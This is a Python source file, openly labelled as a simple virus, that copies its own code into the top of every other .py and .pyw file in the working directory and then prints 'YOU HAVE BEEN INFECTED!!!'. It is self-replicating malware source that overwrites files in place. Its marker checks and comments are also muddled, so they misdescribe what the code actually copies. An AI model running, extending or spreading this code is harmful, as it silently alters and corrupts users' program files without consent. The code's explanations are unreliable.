'''Simple virus code

	THREE PARTS

	1. Make a copy of the virus program
	2. Infect other python files with the virus replication code
	3. Execute/implement the virus code to the system

	* It is paramount that the comment for "BEGIN VIRUS CODE"
	 remains otherwise change the string for replication below
'''

# BEGIN VIRUS CODE
import sys
import glob
from glob import glob


# 1. DEFINE SELF-REPLICATION
virus_code = []		# use array to store the innocent portion of the file

this_file = sys.argv[0]
lines = []

with open(this_file, 'r') as f:
	this_file_lines = f.readlines()

# mark which portion of the file (the virus code) should be passed to other files
self_replicating_portion_of_code = False

# go through the file to be infected
for line in this_file_lines:

	print("reading line --> %s" % line)

	if line == "# BEGIN VIRUS CODE":		# string from line 14 of this file
		self_replicating_portion_of_code = True

	if not self_replicating_portion_of_code:
		virus_code.append(line)

	if line == "# END VIRUS CODE":
		break


# 2. INFECT OTHER PYTHON FILES
other_python_files = glob('*.py') + glob('*.pyw')

for i in other_python_files:
	print(i)

for other_file in other_python_files:
	print("checking file %s" % other_file)
	
	# set check for whether file is already infected by us
	already_infected = False
	innocent_files_code = []

	with open(other_file,'r') as f:
		innocent_files_code = f.readlines()

	for line in innocent_files_code:
		if "# BEGIN VIRUS CODE" in line:
			print("already infected. i shouldnt do anything with this file... ")
			already_infected = True

	# reset the code to include the virus at the top of that file
	print("file %s infected" % already_infected)

	if not already_infected:
		other_files_code = []
		other_files_code.extend(virus_code)
		other_files_code.extend('\n')
		other_files_code.extend(innocent_files_code)



		print(other_files_code)

		# finally, rewrite the other file
		with open(other_file, 'w') as f:
			f.writelines(other_files_code)

	else:
		print("not touching it!")


# 3. WRITE VIRUS INSTRUCTIONS
def malicious_code():
	print("YOU HAVE BEEN INFECTED!!!")


malicious_code()
# END VIRUS CODE

